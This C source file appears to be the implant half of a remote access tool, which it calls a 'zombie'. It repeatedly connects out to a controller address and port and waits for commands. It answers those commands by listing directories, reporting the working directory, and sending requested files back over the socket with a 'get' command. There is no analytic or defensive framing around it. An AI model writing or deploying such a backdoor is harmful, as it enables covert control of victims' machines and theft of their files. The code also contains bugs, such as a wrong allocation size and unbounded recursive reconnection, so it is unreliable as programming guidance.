#include "conx.h"

static struct sockaddr_in remote_addr;
static int zombie_socket;
static const uint16_t BUFFER_LENGTH = 1024;
static char* data_2_send;

void init_zombie(const char *restrict rhost, const uint16_t rport)
{
    if((zombie_socket = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, IPPROTO_TCP)) < 0)
    {
        fatal_exit("socket");
    }

    memset(&remote_addr, '\0', sizeof(remote_addr));

    remote_addr.sin_family = AF_INET;
    remote_addr.sin_port = htons(rport);

    if(inet_aton(rhost, &remote_addr.sin_addr) < 0)
    {
        cleanup();
        memset(&remote_addr, '\0', sizeof(remote_addr));

        fatal_exit("inet_aton");
    }

    memset(&remote_addr.sin_zero, '\0', sizeof(remote_addr.sin_zero));

    conx();
}

void conx()
{
    if(connect(zombie_socket, (struct sockaddr *)&remote_addr, sizeof(remote_addr)) < 0)
    {
        fprintf(stderr, "[!] RHOST seems to be down... Let's wait 5 seconds.\n");
        sleep(5);
        conx();
    }
    receive_command();
}

void cleanup()
{
    shutdown(zombie_socket, SHUT_RDWR);
    close(zombie_socket);
}

void receive_command()
{
    char* buffer = (char *)calloc(BUFFER_LENGTH, sizeof(char *));
    int rec_bytes = 0;

    while(1){
        rec_bytes = recv(zombie_socket, buffer, BUFFER_LENGTH, 0);

        if(rec_bytes < 0)
        {
            fprintf(stderr, "[*] There's a problem: %s\n", strerror(errno));
            sleep(5);
        }
        else if (rec_bytes == 0)
        {
            fprintf(stdout, "[!] Disconnected...\n[*] Recreating socket.\n");
            break;
        }
        else if(rec_bytes > 0)
        {
            process_command(buffer);
        }
        memset(buffer, '\0', BUFFER_LENGTH);
    }
    free(buffer);
    buffer = NULL;
    recreate_socket();
}

void process_command(const char *restrict buffer)
{
    if(strncmp(buffer, "help", 4) == 0)
    {
        data_2_send = help_command();
    }
    else if(strncmp(buffer, "pwd", 3) == 0)
    {
        data_2_send = current_directory();
    }
    else if(strncmp(buffer, "ls", 2) == 0)
    {
        data_2_send = list_directories(buffer);
    }
    else if(strncmp(buffer, "get", 3) == 0 && strlen(buffer) > 6)
    {
        send_file(zombie_socket, buffer + 4);
        return;
    }
    else
    {
        data_2_send = help_command();
    }

    send_command_result(data_2_send);
    
}

void send_command_result(const char *restrict buffer)
{
    if(send(zombie_socket, buffer, strlen(buffer), 0) < 0)
    {
        perror("send");
    }
}

void fatal_exit(const char *restrict msg)
{
    perror(msg);
    _exit(errno);
}

void recreate_socket()
{
    init_zombie(inet_ntoa(remote_addr.sin_addr), ntohs(remote_addr.sin_port));
}